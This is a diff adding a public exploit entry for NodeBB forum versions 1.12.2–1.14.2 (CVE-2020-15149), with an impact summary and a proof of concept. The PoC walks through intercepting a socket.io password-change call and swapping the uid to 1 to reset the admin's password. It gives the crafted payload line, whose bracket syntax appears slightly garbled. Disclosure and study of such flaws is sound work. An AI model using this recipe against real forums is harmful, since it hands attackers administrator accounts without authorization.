@@ -1,0 +1,21 @@
+# Exploit Title:  NodeBB Forum 1.12.2-1.14.2 - Account Takeover
+# Date: 2020-08-18
+# Exploit Author: Muhammed Eren Uygun
+# Vendor Homepage: https://nodebb.org/
+# Software Link: https://github.com/NodeBB/NodeBB
+# Version: 1.12.2-1.14.2
+# Tested on: Linux
+# CVE : CVE-2020-15149 - https://github.com/NodeBB/NodeBB/security/advisories/GHSA-hr66-c8pg-5mg7
+Impact:
+----------------------
+A bug in this validation logic made it possible to change the password of any user on a running NodeBB forum by sending a specially crafted socket.io call to the server. This could lead to a privilege escalation event due via an account takeover.
+
+Bug PoC:
+----------------------
+Blog: https://medium.com/bugbountywriteup/privilege-escalation-via-account-takeover-on-nodebb-forum-software-512-a593a7b1b4a4
+1- Create a user
+2- Go to password change page
+3- Change password with proxy
+427["user.changePassword",("currentPassword":"Test.12345!","newPassword":"Admin123!","uid":5)])
+4- Replace the uid on the request with 1, which is the uid value of the admin user, and send the request.
+5-  So you can login with this password to admin user.
